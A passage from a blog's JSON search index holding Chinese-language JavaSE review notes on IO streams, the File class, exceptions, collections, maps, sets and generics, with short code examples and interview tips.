null) fis.close(); //能关掉一个算一个 &#125;finally &#123; if(fos != null) fos.close(); &#125;&#125; 1.7版本新特性之异常处理的标准代码： 新特性： 在try后接一个小括号，我们把流对象写在小括号内，程序运行完之后自动关闭流 为什么会自动关闭流？ 因为，FileInputStream 与 FileOutputStream 类都实现了AutoCloseable接口，当然我们自己写个类然后重写close方法也能实现自动关闭 注意事项： 在开发中用到的不多，但是要知道，因为面试肯能会遇到。 try close12345678910try( FileInputStream fis = new FileInputStream(\"aaa.txt\"); FileOutputStream fos = new FileOutputStream(\"bbb.txt\"); MyClose mc = new MyClose();)&#123; int b; while((b = fis.read()) != -1) &#123; fos.write(b); &#125;&#125; 拓展知识之——文件加密 原理 我们知道2 ^ 3 = 1这是个异或运算也就是0010 ^ 0011 = 0001. 那么我们就可以 源数据 ^ 密文 = 加密后的数据加密后的数据 ^ 密文 = 源数据 通过异或这个原理，我们可以知道用相同数异或两编，那么原来的数就会回来，这样我们就可以再写出字节流时，把写出的数据进行一遍异或运算，这样就达到了加密的效果，解密就是读取的时候再异或同样的数，这样原来的数据就回来了，不过这样加密数据为了代码更加简洁就需要使用Buffered的字节流对象，不能自己创建缓冲区了。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"IO流","slug":"IO流","permalink":"http://liuhaoan.github.io/tags/IO流/"},{"name":"文件字节流","slug":"文件字节流","permalink":"http://liuhaoan.github.io/tags/文件字节流/"},{"name":"标准异常处理代码（面试会用到，背都要背下来）","slug":"标准异常处理代码（面试会用到，背都要背下来）","permalink":"http://liuhaoan.github.io/tags/标准异常处理代码（面试会用到，背都要背下来）/"}]},{"title":"javaSE复习之——IO流的概念","slug":"javaSE复习之——IO流的概念","date":"2019-04-10T07:08:28.000Z","updated":"2019-04-10T07:12:34.865Z","comments":true,"path":"2019/04/10/javaSE复习之——IO流的概念/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流的概念/","excerpt":"IO流的概念 1、IO流用来处理设备之间的数据 2、java对数据的操作时通过流的方式 3、java用于操作流的类都在IO包中 4、流按照操作类型分为两种： 字节流：字节流可以操作任何数据，因为在计算机中任何数据都是以字节形式储存的 字符流：字符流只能操作纯字符类型的数据，比较方便","text":"IO流的概念 1、IO流用来处理设备之间的数据 2、java对数据的操作时通过流的方式 3、java用于操作流的类都在IO包中 4、流按照操作类型分为两种： 字节流：字节流可以操作任何数据，因为在计算机中任何数据都是以字节形式储存的 字符流：字符流只能操作纯字符类型的数据，比较方便 5、按照流向分类分为：输入流、输出流 IO流的常用父类 字节流的抽象父类： InputStream（输入流） outputStream（输出流） 字符流的抽象父类： Reader（输入流） Writer（输出流） IO的使用 1、使用前，导入IO包 2、使用时，进行IO异常处理 ps：因为IO流时处理内存和硬盘之间的关系，如果硬盘没有某个文件，那么会出错 3、使用后释放资源 ps：因为IO流相当于一个建立在内存和硬盘之间的管道，不用了就要把这个管道关闭。 IO流的注意事项 流对象尽量晚开早关","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"IO流的概念","slug":"IO流的概念","permalink":"http://liuhaoan.github.io/tags/IO流的概念/"}]},{"title":"javaSE复习之——File类","slug":"javaSE复习之——File类","date":"2019-04-10T06:54:23.000Z","updated":"2019-04-10T07:04:54.802Z","comments":true,"path":"2019/04/10/javaSE复习之——File类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——File类/","excerpt":"File的概述 它是文件或者目录的抽象表现形式，其实File更应该叫做一个路径，分为文件路径和文件夹路径，路径分为相对路径和绝对路径。 Flie的实例化 File(pathname) 直接根据一个路径得到File对象 File(parent，child) parent是父级路径，child是子文件或者文件夹，在一个目录下我们需要处理多个子文件或文件夹时可以更方便 File(file, child) file是一个File对象，chile是子文件或文件夹，封装成File传入更加强大，可以用到File类中的功能","text":"File的概述 它是文件或者目录的抽象表现形式，其实File更应该叫做一个路径，分为文件路径和文件夹路径，路径分为相对路径和绝对路径。 Flie的实例化 File(pathname) 直接根据一个路径得到File对象 File(parent，child) parent是父级路径，child是子文件或者文件夹，在一个目录下我们需要处理多个子文件或文件夹时可以更方便 File(file, child) file是一个File对象，chile是子文件或文件夹，封装成File传入更加强大，可以用到File类中的功能 File类的方法 .exists() 判断文件是否存在，存在true .createNewFile() 判断是否存在某个文件，不存在创建返回true，存在返回false .mkdir() 创建文件夹成功返回true，不成功返回false .mkdirs() 创建多级文件夹 .renameTo(file) 把文件重命名为指定路径 注意事项：1、如果路径名相同，那就是改名2、如果路径名不同，那就是改名并且剪切 .delete() 删除文件或者文件夹 注意事项：1、Java中的删除不走回收站2、只能说删除空的文件夹，如果文件夹里面还有内容，就需要遍历一个一个删除 File类的判断方法 .isDirectory() 判断是否是目录 .isFile() 判断是否是文件 .exists() 判断是否存在 .canRead() 判断是否可读 ps：windows系统的所有文件都是可读的，linux系统就可以不能读 .canWrite() 判断是否可写 .isHidden() 判断是否隐藏 File类的获取方法 .getAbsolutePath() 获取绝对路径（包括盘符的路径） .getPath() 获取路径（构造File方法时传入的路径） .geName() 获取名称 .length() 获取长度（字节数） .lastModified() 获取最后一次修改时间（毫秒值） .list() 获取目录下所有文件或文件夹名称，返回一个String数组 .listFiles() 获取目录下所有文件或文件夹名称，返回一个File数组 文件名称过滤器FilenameFilter概述 通过重写FilenameFilter类中的accept方法，然后调用list方法获取所有文件时传入可以达到过滤文件的目的 示例： 12345678910111213String[] arr = dir.list(new FilenameFilter() &#123; @Override public boolean accept(File dir, String name) &#123; File file = new File(dir, name); return file.isFile() &amp;&amp; file.getName().endsWith(\".jpg\"); //重写的accept方法一直返回true则获取到所有文件和文件夹，返回falst则不获取那个文件或者文件夹 &#125;&#125;);for (String string : arr) &#123; System.out.println(string);&#125; 利用递归获取.java结尾的文件：123456789101112131415public static void main(String[] args) &#123; getFile(new File(\".\\\\\"));&#125;public static void getFile(File f) &#123; File[] farr = f.listFiles(); for(File name : farr) &#123; if(name.isFile() &amp;&amp; name.getPath().endsWith(\".java\")) &#123; System.out.println(name.getName()); &#125;else if(name.isDirectory())&#123; getFile(name); &#125; &#125;&#125;","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"File类","slug":"File类","permalink":"http://liuhaoan.github.io/tags/File类/"}]},{"title":"javaSE复习之——异常","slug":"javaSE复习之——异常","date":"2019-04-10T06:29:06.000Z","updated":"2019-04-10T06:53:35.384Z","comments":true,"path":"2019/04/10/javaSE复习之——异常/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——异常/","excerpt":"异常的概述 异常就是java程序在运行过程中出现的错误 异常类 Throwable 异常的继承体系： Throwable Error 服务器出问提，数据库崩溃等 Exception RuntimeException 这个是运行时异常，全部的运行时异常都在这，一般都是我们自己犯的错误，修改代码即可 。。。。。等等","text":"异常的概述 异常就是java程序在运行过程中出现的错误 异常类 Throwable 异常的继承体系： Throwable Error 服务器出问提，数据库崩溃等 Exception RuntimeException 这个是运行时异常，全部的运行时异常都在这，一般都是我们自己犯的错误，修改代码即可 。。。。。等等 jvm默认的异常处理机制 会将异常的名称、异常的信息、异常出现的位置打印在控制台，并且程序停止运行。 异常处理命令 try…catch try 用来检测异常，如果出现异常，那么会抛出一个对应的异常对象 catch 用来捕获异常，需要定义一个引用来接收异常对象，可以使用多个catch来捕获多种异常。 ps：理论上是有什么错误用什么去引用，但是实际开发建议直接创建Exception这个父类引用它的子类对象。 finally 释放资源，一般对io流或者数据库进行关闭 它们三的常用搭配： 1、try catch异常处理基本格式 2、try catch finally 3、try finally ps：。。。。。世界上最真情的相依就是你在try我在catch，无论你发神马脾气，我都静静接收，默默处理。。。。 小知识： 1、安卓开发属于客户端开发，一般都是直接Exception 2、javaEE属于服务端开发，一般都是底层开发，从底层向上抛，最后放到一个错误日志。 3、在有多个catch时，大的异常放后面，因为根据多态的原理，大的异常放前面没有意义。 jdk7以后如何处理多个异常，有时候面试会问 用“|”连接两个异常类即可实现一个catch处理多个异常，但是这样还不如直接Exception。 java异常的种类 Java异常被分为两大类，分别是编译时异常和运行时异常。 编译时异常java程序必须显示处理，否则就会发生错误，不处理无法通过编译 运行时异常 无需显示处理，也可以和编译时异常一样处理 Throwable的几个常见方法： .getMessage() 获取异常信息，返回字符串 .toString() 获取异常类名和异常信息，返回字符串 .printStackTrace() 获取异常类名和异常信息，以及异常出现在程序中的位置，返回值void，jvm默认用它处理异常。 异常抛出 throw new 异常类 注意事项： 除了RuntimeException类的错误，也就是运行时错误，其他错误都要在方法上使用throws向上抛出这个错误。 异常的抛出例子： 1234567public void setAge(int age) throws Exception&#123; if(age &gt; 0 || age &lt; 150) &#123; this.age = age; &#125;else &#123; throw new Exception(\"年龄非法\"); &#125;&#125; throw概述 在功能方法内部出现某种情况，程序不能继续运行，需要进行跳转时，就用throw把异常抛出 throws和throw区别，可能面试会问： throws 1、用在方法声明后面，跟的时异常类名 2、可以跟多个异常类名，用逗号隔开 3、表示这个方法抛出了异常，让方法的调用者来处理 throw 1、用在方法体内部，跟的时异常对象名 2、只能抛出一个异常对象名，不能接多个 3、表示这个方法抛出了异常，方法内部处理 finally特点： 被finally控制的语句一定会执行，就算执行了return语句finally中的语句也会执行 特殊情况：在执行到finally之前jvm退出了，比如执行System.exit(0) finally作用 用于资源释放，通常在哎IO流和数据库操作中会使用 finally关键字的面试题： final，finally和finalize的区别 解答：final：修饰类不能被继承，修饰方法不能被重写，修饰变量只能赋值一次（常量） finally：它是tyr语句中的语句体，不能单独使用，它用来释放资源 finalize：是一个方法，当垃圾回收器确定不存在对该对象的引用时，对象的垃圾回收器调用此方法。ps：他们三没任何联系，只是长得像而已。 如果catch里面有return语句，请问finally的代码还会执行吗?如果会请问时在return前还是return后？ 解答：会，并且是在return之后执行，因为在return相当于已经建立好了一个返回路径，然后再执行finally，然后再根据之前建立的返回路径彻底返回。 ps：千万不要再finally内写返回语句，因为finally的作用是为了释放资源，如果再这里写返回语句，那么try和catch的结果都会被改变。 自定义异常方法 定义一个异常类，然后继承Exception并重写构造方法即可 代码示例：12345678910111213class AgeOutOfBoundsException extends Exception &#123; public AgeOutOfBoundsException() &#123; super(); &#125; public AgeOutOfBoundsException(String message) &#123; super(message); &#125; &#125; 为什么要自定义异常？ 解答： 只是为了看那个异常类的名字而已，这样好排错。 ps：继承RuntimeException的话可以不用在声明方法那里抛出异常 异常注意事项 1、子类重写父类方法时，子类必须抛出相同异常或者父类异常的子类，也就是说子类抛出的异常不能比父类大，需要比父类更加细，打个比方，父亲坏儿子不能比他更坏。父亲没坏儿子自己处理 2、如果父类抛出多个异常，子类重写父类的时候子类不能抛出父类没有的异常 3、如果被重写的方法没有抛出异常，那么子类绝对不可以抛出异常，如果子类有异常只能用try不能throws抛出 如何使用异常处理？ 原则： 如果该功能内部可以将问题处理，就用try，不能处理就用throws向上抛出，交给调用者处理 区别： 1、后面还有代码需要执行，就用try 2、如果后面不需要代码执行了，就用throw","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"异常","slug":"异常","permalink":"http://liuhaoan.github.io/tags/异常/"},{"name":"throw","slug":"throw","permalink":"http://liuhaoan.github.io/tags/throw/"},{"name":"throws","slug":"throws","permalink":"http://liuhaoan.github.io/tags/throws/"},{"name":"final，finally和finalize的区别面试题","slug":"final，finally和finalize的区别面试题","permalink":"http://liuhaoan.github.io/tags/final，finally和finalize的区别面试题/"}]},{"title":"javaSE复习之——Collections工具类与集合总结","slug":"javaSE复习之——Collections工具类与集合总结","date":"2019-04-10T03:18:32.000Z","updated":"2019-04-10T03:48:11.693Z","comments":true,"path":"2019/04/10/javaSE复习之——Collections工具类与集合总结/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——Collections工具类与集合总结/","excerpt":"Collections中的常用方法 Collections.sort(list) 把集合进行排序 Collections.banarySearch(list, 需要查的元素) 用二分查找法查询某个集合中的元素，二分查找法前提是集合是有序的，找不到返回-(插入点 - 1） Collections.max(list) 根据默认排序返回集合中最大的元素","text":"Collections中的常用方法 Collections.sort(list) 把集合进行排序 Collections.banarySearch(list, 需要查的元素) 用二分查找法查询某个集合中的元素，二分查找法前提是集合是有序的，找不到返回-(插入点 - 1） Collections.max(list) 根据默认排序返回集合中最大的元素 Collections.min(list) 根据默认排序返回集合中最小的元素 Collections.reverse(list) 反转集合 Collections.shuffle(list) 随机置换，可以洗牌。 集合总结 Collection List(存取有序,有索引,可以重复) ArrayList 底层是数组实现的,线程不安全,查找和修改快,增和删比较慢 LinkedList 底层是链表实现的,线程不安全,增和删比较快,查找和修改比较慢 Vector 底层是数组实现的,线程安全的,无论增删改查都慢 如果查找和修改多,用ArrayList如果增和删多,用LinkedList如果都多,用ArrayList Set(存取无序,无索引,不可以重复) HashSet 底层是哈希算法实现 LinkedHashSet底层是链表实现,但是也是可以保证元素唯一,和HashSet原理一样 TreeSet 底层是二叉树算法实现 一般在开发的时候不需要对存储的元素排序,所以在开发的时候大多用HashSet,HashSet的效率比较高 TreeSet在面试的时候比较多,问你有几种排序方式,和几种排序方式的区别 Map HashMap 底层是哈希算法,针对键 LinkedHashMap底层是链表,针对键 TreeMap 底层是二叉树算法,针对键 ps：开发中用HashMap比较多 面试题之——TreeSet或者TreeMap有几种排序方式和区别TreeSet或者TreeMap排序的两种方式 第一种 构造TreeSet集合什么都不传，就默认使用类中的Comparable的顺序，也就是compareTo方法。（传入集合的自定义对象实现了Comparable接口则用自定义类中重写的compareTo方法） 第二种 构造TreeSet集合传入Comparator比较器，那么优先按照比较器顺序排序。 引用自javaSE复习之——TreeSet类 ps： 1、在开发中，单列集合存储重复元素优先考虑ArrayList，不重复的元素优先考虑HashSet，双列集合直接考虑HashMap 2、单列集合（collection）中Set集合类型其实底层都依赖map集合，它封装了map集合，当中只使用到了key，而value用固定的值替代(Object对象)。 3、tree类型的map和set集合平时都不常用，但是面试会用，一般问你有几种排序方式,和几种排序方式的区别","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"集合总结","slug":"集合总结","permalink":"http://liuhaoan.github.io/tags/集合总结/"},{"name":"Collections工具类","slug":"Collections工具类","permalink":"http://liuhaoan.github.io/tags/Collections工具类/"},{"name":"面试题之——TreeSet或者TreeMap有几种排序方式和区别","slug":"面试题之——TreeSet或者TreeMap有几种排序方式和区别","permalink":"http://liuhaoan.github.io/tags/面试题之——TreeSet或者TreeMap有几种排序方式和区别/"}]},{"title":"javaSE复习之——Map类","slug":"javaSE复习之——Map类","date":"2019-04-10T02:54:56.000Z","updated":"2019-04-10T03:13:41.372Z","comments":true,"path":"2019/04/10/javaSE复习之——Map类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——Map类/","excerpt":"map集合的概述 它是将键映射到值的对象，类似python中的字典，它是无序的。","text":"map集合的概述 它是将键映射到值的对象，类似python中的字典，它是无序的。 特点 1、一个map对象不能包含重复的键 2、一个键只能映射到一个值 3、map接口的实现分为hashMap和treeMapps：只要是hash算法实现的集合，那么它都是无序的。 4、map集合不能直接进行迭代。 解决方法1（底层调用原map集合太多）利用keySet获取所有键的对象，然后迭代这个对象逐个get获取值，这样可以从侧面迭代map集合。ps：利用增强for循环可以更简便的拿到map集合中的每个值。 解决方法2（推荐使用）：利用entrySet方法获取一个键值对Entry对象，然后迭代或者增强for循环这个Entry对象然后逐个获取值即可。 注意事项：传入引用数据类型时，必须重写hashCode和equals方法 map和colllection的不同： 1、map是双列的，collection是单列的 2、map键唯一，collection只有它的子体系Set是唯一的ps：其实set集合是依赖与map的hash算法的，只是set集合中把map集合封装了一下，里面只使用了键，而值用object对象填充 3、Map的数据结构只针对键有效，和值无关；collection的数据结构针对元素有效 创建map对象1map&lt;String, Integer&gt; map = new hashMap&lt;&gt;(); map集合中的方法 添加方法： .put(key, value)向map集合中添加一个键值对元素，新添加返回null，覆盖返回被覆盖的值 删除方法： .clear()删除全部键值对元素 .remove(key)删除指定键对应的键值对 判断方法： .containsKey(key)判断集合中是否包含指定的键 .containsValue(value)判断集合中是否包含指定的值 .isEmpty()判断集合是否为空 获取功能： .entrySet()拿到map集合的键值对象，返回set&lt;map.Entry&lt;K,V&gt;&gt;ps：Map.Entry是Map接口的内部接口，它实现了将键和值封装成了一个Entry对象，储存再Set集合中。 .get(key)根据键获取值 .keySet()获取集合中所有键的集合，返回Set .values()获取集合中所有值的集合，返回Collection 长度功能： .size()返回键值对个数 linkedHashMap特点 它是有序的，怎么存就怎么打印 TreeMap特点： 1、可以用来排序，值是唯一的，等等 2、传入引用数据类型时，必须重写compareTo方法，否则无法判断值的唯一性，会报错。 3、具体笔记在TreeSet集合中介绍 hashtable和hashMap区别（面试题）： 共同点： 1、底层都依赖hash算法 2、都是双列集合 不同点： 1、HashMap是线程不安全的，效率高，jdk1.2版本出现的 2、Hashtable是线程安全的，效率相对第，jdk1.0版本出现的 3、HashMaop可以储存null键和null值 4、Hashtable不可以储存null键和null值","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Map类","slug":"Map类","permalink":"http://liuhaoan.github.io/tags/Map类/"},{"name":"linkedHashMap类","slug":"linkedHashMap类","permalink":"http://liuhaoan.github.io/tags/linkedHashMap类/"},{"name":"TreeMap类","slug":"TreeMap类","permalink":"http://liuhaoan.github.io/tags/TreeMap类/"},{"name":"hashtable和hashMap区别（面试题）","slug":"hashtable和hashMap区别（面试题）","permalink":"http://liuhaoan.github.io/tags/hashtable和hashMap区别（面试题）/"}]},{"title":"javaSE复习之——TreeSet类","slug":"javaSE复习之——TreeSet类","date":"2019-04-10T02:32:14.000Z","updated":"2019-04-10T02:54:13.960Z","comments":true,"path":"2019/04/10/javaSE复习之——TreeSet类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——TreeSet类/","excerpt":"TreeSet的概述 它是一个二叉树集合，小的（负数）放在左边，大的（正数）放在右边，并且对集合元素进行排序，并且可以保证元素的唯一性，也就是去除重复，它的主要功能是排序。它依赖map集合","text":"TreeSet的概述 它是一个二叉树集合，小的（负数）放在左边，大的（正数）放在右边，并且对集合元素进行排序，并且可以保证元素的唯一性，也就是去除重复，它的主要功能是排序。它依赖map集合 TreeSet特点： TreeSet集合存储元素取决于compareTo方法的返回值。 返回0：表示作比较的两个对象是相等的，这时集合不存这个元素。 返回负数：表示要存入的元素小于上一个作比较元素，然后把这个元素放在作比较元素的左边，如果它的左边还有元素就再进行比较 返回正数：表示大于上一个元素，这时把这个元素放在上一个元素的右边，如果右边还有元素，就再进行比较。 TreeSet存元素的原理 首先存入第一个元素（根元素），然后再存入第二个元素时调用compareTo方法取到返回值，然后根据返回值存元素； 如果之前已经存了n个元素，那么调用compareTo逐次与每个元素作比较， TreeSet取元素原理 从最小的开始取，也就是从左向右取，先取根元素左边的元素，如果根元素左边的元素下面还有元素就先从那里开始取，这里也是从左到右的原理，取根元素右边元素也是同理，从左边向右边取元素，如果左边或右边元素下面还有元素，那么也是遵循从左到右的原则。 注意：左边元素全部取完后再慢慢向右边取 为什么存入自定义对象的时候会报错？ 原因： 因为TreeSet会对集合元素进行排序，而它不知道自定义对象按照什么方法来排序，所以会报错。 解决方法： 让自定义对象这个类去实现Comparable接口，然后重写compareTo方法，此方法返回0则集合只能存一个对象，返回1按照存的顺序排序，返回-1按照存的顺序的倒叙存。 重写compareTo例子1234public int compareTo(Student o) &#123; int num = o.sum - this.sum; return num == 0 ? 1 : num;&#125; ps：比较字符串可以调用字符串的conpareTo方法比较 TreeSet比较器Comparator的概述 可以自定义对TreeSet集合进行排序 使用方法 首先创建一个类并且让这个类实现Comparator接口，然后重写compare方法，最后在创建TreeSet集合对象的时候创建这个类的对象传入即可。 特点 compare方法中第一个参数是调用的对象，第二个参数是被比较集合中的对象 两种排序方式的区别 1、构造TreeSet集合什么都不传，就默认使用类中的Comparable的顺序，也就是compareTo方法。（传入集合的自定义对象实现了Comparable接口则用自定义类） 2、构造TreeSet集合传入Comparator比较器，那么优先按照比较器顺序排序。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"TreeSet类","slug":"TreeSet类","permalink":"http://liuhaoan.github.io/tags/TreeSet类/"},{"name":"Comparator比较器","slug":"Comparator比较器","permalink":"http://liuhaoan.github.io/tags/Comparator比较器/"}]},{"title":"javaSE复习之——HashSet类","slug":"javaSE复习之——HashSet类","date":"2019-04-10T02:09:18.000Z","updated":"2019-04-10T02:33:09.875Z","comments":true,"path":"2019/04/10/javaSE复习之——HashSet类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——HashSet类/","excerpt":"概述 他没有自己特殊的方法，它的方法和Collection一样，HashSet集合不能存重复的数据，并且是无顺序的。 特点： 1、没有索引 2、不可以重复 3、无顺序（存和取不一致）","text":"概述 他没有自己特殊的方法，它的方法和Collection一样，HashSet集合不能存重复的数据，并且是无顺序的。 特点： 1、没有索引 2、不可以重复 3、无顺序（存和取不一致） 为为什么要存储自定义对象 因为别人的类我们不知道它重写了哪些方法来保证元素的一致性。 HashSet集合存集合的原理 加入每个元素都会先调用hashCold方法来生成一个Hash值，这个值就相当于存那个元素的地址，如果hash值不一样就不会调用equals方法判断，如果hash值相同就通过equals方法对比在同一个地址中的数据是不是相同的，相同丢弃不相同就存入。 HashSet中遇到的常见问题： 为什么在集合中存入自定义对象的时候重复的数据也会被存进去？ 原因1:因为父类的hashCold方法会为每一个元素生成不一样的hash值，所以导致地址不一样 原因2:父类的equals方法对比的时对象的地址，而不是对象里面的值 解决方法：在自定义的类中重写equals方法和hashCold方法 为什么尽量使用计算hash值的方法来判断两个我们知道相等的对象是否相等？ 原因：HashSet集合加入元素的顺序是先判断hash值如果hash值一样就调用equals判断，如果我们用算法让相同的对象值计算出相同的hash值，不同的对象值计算出不同的hash值，那么就可以让程序少调用一次equals方法，这样可以提高效率。 注意事项：重写hashCold方法时，属性相同的对象hash值一定要一样，属性不一样的对象hash值要尽量不一样（提高效率） 重写hashCold中的面试题： 为什么使用Eclipse重写的hashCold方法中，为了让传入对象计算的hash值不一样，而定义的一个用来算法计算的值是31？ 原因1：它是一个质数，它只能被1和本省整除，这样可以减小两个对象计算的hash值相同的概率 原因2：31这个数不大也不小，太小了计算的值容易重复，太大了容易超过int范围。 原因3：31这个数好算，它是2的5次方-1，也就是2的二进制位向左移动5位。 LinkedHashSet的概述 它的底层是链表实现,并且是非线程安全的，也是Set集合中唯一 一个能保证怎么存就怎么取的集合对象，因为它的父类是HashSet，所以也是保证元素唯一的，它的原理与HashSet一样。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"HashSet类","slug":"HashSet类","permalink":"http://liuhaoan.github.io/tags/HashSet类/"},{"name":"LinkedHashSet类","slug":"LinkedHashSet类","permalink":"http://liuhaoan.github.io/tags/LinkedHashSet类/"}]},{"title":"javaSE复习之——增强for循环、JDK5新特性与可变参数","slug":"javaSE复习之——增强for循环、JDK5新特性与可变参数","date":"2019-04-10T01:54:58.000Z","updated":"2019-04-10T02:04:55.964Z","comments":true,"path":"2019/04/10/javaSE复习之——增强for循环、JDK5新特性与可变参数/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——增强for循环、JDK5新特性与可变参数/","excerpt":"增强for循环的概述 简化数值与集合的遍历，不需要那么麻烦了，它的底层依赖的是iterator迭代器。 使用方法：123for(创建一个临时变量储存数据：需要遍历的数组或者集合) &#123; 在这里使用那个临时变量就好了。&#125; eclipse可以直接输入fore然后按提示快捷键 ps：只要可以用迭代器迭代，那么就可以用增强for循环。","text":"增强for循环的概述 简化数值与集合的遍历，不需要那么麻烦了，它的底层依赖的是iterator迭代器。 使用方法：123for(创建一个临时变量储存数据：需要遍历的数组或者集合) &#123; 在这里使用那个临时变量就好了。&#125; eclipse可以直接输入fore然后按提示快捷键 ps：只要可以用迭代器迭代，那么就可以用增强for循环。 JDK5新特性 可以导入类里的静态方法，不过意义不大，开发不用，但是要看得懂。 使用方法1import static 包名.类名.方法名 可变参数的概述 定义方法的时候不知道该定义多少个参数,我们就可以用到可变参数 格式1public void a(数据类型 ... 变量名) 注意事项 1、这里的变量其实底层是一个数组 2、如果一个方法里有多个参数，那么可变参数一定要放在最后面","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"JDK5新特性","slug":"JDK5新特性","permalink":"http://liuhaoan.github.io/tags/JDK5新特性/"},{"name":"增强for循环","slug":"增强for循环","permalink":"http://liuhaoan.github.io/tags/增强for循环/"},{"name":"可变参数","slug":"可变参数","permalink":"http://liuhaoan.github.io/tags/可变参数/"},{"name":"静态导入","slug":"静态导入","permalink":"http://liuhaoan.github.io/tags/静态导入/"}]},{"title":"javaSE复习之——泛型","slug":"javaSE复习之——泛型","date":"2019-04-10T01:18:54.000Z","updated":"2019-04-10T03:16:05.856Z","comments":true,"path":"2019/04/10/javaSE复习之——泛型/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——泛型/","excerpt":"泛型的概述 可以把泛型理解成“参数化类型”，他可以在类、接口和方法中使用，分别被称为泛型类、泛型接口、泛型方法。 泛型类的使用1Collection&lt;泛型&gt; = new Collection&lt;&gt;(); 定义方法的作用 指定自己需要使用的数据类型。","text":"泛型的概述 可以把泛型理解成“参数化类型”，他可以在类、接口和方法中使用，分别被称为泛型类、泛型接口、泛型方法。 泛型类的使用1Collection&lt;泛型&gt; = new Collection&lt;&gt;(); 定义方法的作用 指定自己需要使用的数据类型。 泛型接口的定义：1interface Inter&lt;E&gt; &#123;&#125; 泛型类的定义与接口的实现12class press&lt;E&gt; implements Inter&lt;String&gt; &#123; &#125;//在这个类中用E代替传入的数据类型即可 定义类的作用： 在创建这个类的引用或者对象时，可以自己指定数据类型。ArrayList这个类就是这样定义的。 泛型类中方法使用定义好的泛型1public E aa() &#123;&#125; ps：在创建这个泛型类的时候就把这个E给赋值了，赋的值时自己定义的数据类型，可以在方法中直接使用E，当然这个E可以定义成其他的符号。 泛型方法的定义1public&lt;T&gt; aaa() &#123;&#125; 作用： 让类中的某个方法有自己的泛型。 注意事项： 1、在定义了泛型的类中最好不要定义某个方法特有的泛型2、静态方法因为在类的加载就加载了，所以不能使用类的泛型，只能声明自己的泛型。 ps：可以把泛型看作一个变量来理解。 泛型定义示例12345678910111213141516public static void main (String ages[]) &#123; person&lt;String&gt; p =new person&lt;String&gt;(); //创建完之后，E就等于String了 p.b(true); //调用后b这个方法中T的类型就等于Boolean了 &#125;class person&lt;E&gt; &#123;private E a;public&lt;T&gt; void b(T tt) &#123; E s; System.out.println(tt); &#125;&#125; 泛型作用 限制某个集合只能存什么类型的数据,防止出现数据的安全隐患。 泛型的好处： 1、提高了安全性（因为能限制只能存什么数据，所以把运行期的错误转移到了编译期） 2、省去了数据需要从Object强转的麻烦 泛型的注意事项 1、泛型的数据类型一定要时引用数据类型。 2、不要把泛型数据类型定义成Object，因为没有任何意义。 jdk1.7版本新特性：菱形泛型 解析：创建对象时，等号前面&lt;&gt;里写了泛型，那么后面&lt;&gt;里可以不写数据类型，因为两个尖括号放一起很想菱形，所以叫做菱形泛型。 泛型高级之——通配符？ &lt;?&gt; 1ArrayList&lt;?&gt; a = new ArrayList&lt;&gt;(); 当我们遇到右边返回对象时，这时我们不知道返回对象的泛型(类型)是什么，那么我们左边就可以用通配符”?”来替代。 &lt;？ extends E&gt; 向下限定，表示只能传入E或者它的子类。 泛型的边界定义 &lt;？ extends E&gt;： 泛型固定上边界，向下限定，表示只能传入E或者它的子类。 &lt;? super E&gt;: 泛型固定下边界，向上限定，表示只能传入E或者它的父类","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"泛型","slug":"泛型","permalink":"http://liuhaoan.github.io/tags/泛型/"},{"name":"泛型边界定义","slug":"泛型边界定义","permalink":"http://liuhaoan.github.io/tags/泛型边界定义/"}]},{"title":"javaSE复习之——Collection集合框架","slug":"javaSE复习之——Collection集合框架","date":"2019-04-09T12:54:50.000Z","updated":"2019-04-09T13:31:54.695Z","comments":true,"path":"2019/04/09/javaSE复习之——Collection集合框架/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Collection集合框架/","excerpt":"集合与数值的区别 1、数组即可以存基本数据类型也可以存引用数据类型(对象) 2、集合只能存引用数据类型，如果存基本数据类型，那么系统会自动装箱成对象。 3、数组的长度是固定的，不能自动增长 4、集合的长度是可变的。","text":"集合与数值的区别 1、数组即可以存基本数据类型也可以存引用数据类型(对象) 2、集合只能存引用数据类型，如果存基本数据类型，那么系统会自动装箱成对象。 3、数组的长度是固定的，不能自动增长 4、集合的长度是可变的。 集合与数组的缺点 数组： 长度是固定的，不能自动增加 集合： 会浪费很多空间， 原因：它的部分底层是数组，它增加长度的方法是首先创建长度为10的数组，然后不够就1.5倍增加，直到够存下为止。 Collection集合的继承体系图:123456789101112131415 Collection 单列集合的根接口,它是抽象类，一般用来父类引用子类对象 / \\ / \\ / \\ List Set 有序，有索引，可重复储存 